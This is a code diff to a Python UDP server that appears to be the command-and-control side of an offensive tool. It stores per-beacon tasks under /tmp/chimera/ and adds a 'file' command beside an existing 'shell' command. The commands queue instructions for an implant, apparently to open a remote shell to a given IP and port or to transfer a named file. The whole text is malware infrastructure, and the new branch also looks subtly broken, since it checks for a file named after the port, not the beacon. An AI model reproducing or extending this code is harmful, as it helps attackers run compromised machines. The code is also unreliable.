@@ -64,7 +64,7 @@ def run():
                     sock.sendto(response.encode(), addr)
         elif (len(dataSplit) == 4):
             if (dataSplit[0] == "shell") and (len(dataSplit[1].split('.')) == 4) and ((int(dataSplit[2]) > 0) and (int(dataSplit[2]) <= 510)) and (len(dataSplit[3].split('.')) == 4):
-                if not os.path.exists("/tmp/chimera/" + dataSplit[1]):
+                if not os.path.exists("/tmp/chimera/" + dataSplit[3]):
                     sock.sendto("not_found".encode(), addr)
                 else:
                     ip = dataSplit[1]
@@ -76,8 +76,29 @@ def run():
                     f.close()
                     contSplit = cont.split('\n')
                     contSplit.append("shell")
-                    contSplit.append(ip)
-                    contSplit.append(port)
+                    contSplit.append(ip + ":" + port)
+                    cont = '\n'.join(contSplit)
+                    f = open("/tmp/chimera/" + beacon, "w")
+                    f.write(cont)
+                    f.close()
+                    sock.sendto("confirm".encode(), addr)
+        elif (len(dataSplit) == 5):
+            if (dataSplit[0] == "file") and (len(dataSplit[1]) > 0) and (len(dataSplit[2].split('.')) == 4) and ((int(dataSplit[3]) > 0) and (int(dataSplit[3]) <= 510)) and (len(dataSplit[4].split('.')) == 4):
+                if not os.path.exists("/tmp/chimera/" + dataSplit[3]):
+                    sock.sendto("not_found".encode(), addr)
+                else:
+                    filePath = dataSplit[1]
+                    ip = dataSplit[2]
+                    port = dataSplit[3]
+                    beacon = dataSplit[4]
+                    
+                    f = open("/tmp/chimera/" + beacon, "r")
+                    cont = f.read()
+                    f.close()
+                    contSplit = cont.split('\n')
+                    contSplit.append("file")
+                    contSplit.append(filePath)
+                    contSplit.append(ip + ":" + port)
                     cont = '\n'.join(contSplit)
                     f = open("/tmp/chimera/" + beacon, "w")
                     f.write(cont)
